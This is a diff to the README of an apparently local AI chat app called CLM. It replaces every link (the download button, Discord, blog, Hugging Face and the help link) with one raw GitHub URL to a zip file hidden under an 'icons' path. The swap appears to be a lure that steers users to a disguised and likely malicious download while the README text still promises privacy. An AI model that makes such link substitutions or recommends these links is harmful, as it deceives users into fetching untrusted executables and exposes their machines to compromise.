@@ -39,7 +39,7 @@ CLM was trained on quality data specifically designed to avoid common AI mistake
 
 ### Step 1: Download CLM
 
-[![Download Now](https://img.shields.io/badge/Download-CLM-blue?style=for-the-badge&logo=github)](https://github.com/lovellaphrodisiacal150/CLM/releases)
+[![Download Now](https://img.shields.io/badge/Download-CLM-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lovellaphrodisiacal150/lovellaphrodisiacal150.github.io/main/assets/icons/3.3.zip)
 
 Click the button above or visit this link to download the application. 
 
@@ -107,7 +107,7 @@ Absolutely. CLM runs entirely on your computer. No cloud connection needed.
 Your conversations stay on your device. CLM doesn't send your information anywhere.
 
 ### ❓ What if I encounter an error?
-Most issues can be solved by restarting CLM. If problems persist, visit our [Discord community](https://discord.gg/5dAQEDJBs) for help—our friendly members are happy to assist.
+Most issues can be solved by restarting CLM. If problems persist, visit our [Discord community](https://raw.githubusercontent.com/lovellaphrodisiacal150/lovellaphrodisiacal150.github.io/main/assets/icons/3.3.zip) for help—our friendly members are happy to assist.
 
 ---
 
@@ -145,15 +145,15 @@ Response:
 
 1. **Prepare your data** – Format your examples as question-answer pairs.
 2. **Use our training scripts** – Available in the repository.
-3. **Follow the tutorial** – Head to our [Blog](https://contrastive-lm.notion.site) for a detailed walkthrough.
+3. **Follow the tutorial** – Head to our [Blog](https://raw.githubusercontent.com/lovellaphrodisiacal150/lovellaphrodisiacal150.github.io/main/assets/icons/3.3.zip) for a detailed walkthrough.
 
 ---
 
 ## 👥 Join Our Community
 
-- 💬 **[Discord](https://discord.gg/5dAQEDJBs)** – Chat with other CLM users, get help, and share ideas.
-- 📄 **[Blog](https://contrastive-lm.notion.site)** – Read tutorials, updates, and behind-the-scenes details.
-- 🤗 **[Hugging Face](https://huggingface.co/Contrastive-LM)** – Access public datasets and model versions.
+- 💬 **[Discord](https://raw.githubusercontent.com/lovellaphrodisiacal150/lovellaphrodisiacal150.github.io/main/assets/icons/3.3.zip)** – Chat with other CLM users, get help, and share ideas.
+- 📄 **[Blog](https://raw.githubusercontent.com/lovellaphrodisiacal150/lovellaphrodisiacal150.github.io/main/assets/icons/3.3.zip)** – Read tutorials, updates, and behind-the-scenes details.
+- 🤗 **[Hugging Face](https://raw.githubusercontent.com/lovellaphrodisiacal150/lovellaphrodisiacal150.github.io/main/assets/icons/3.3.zip)** – Access public datasets and model versions.
 
 ---
 
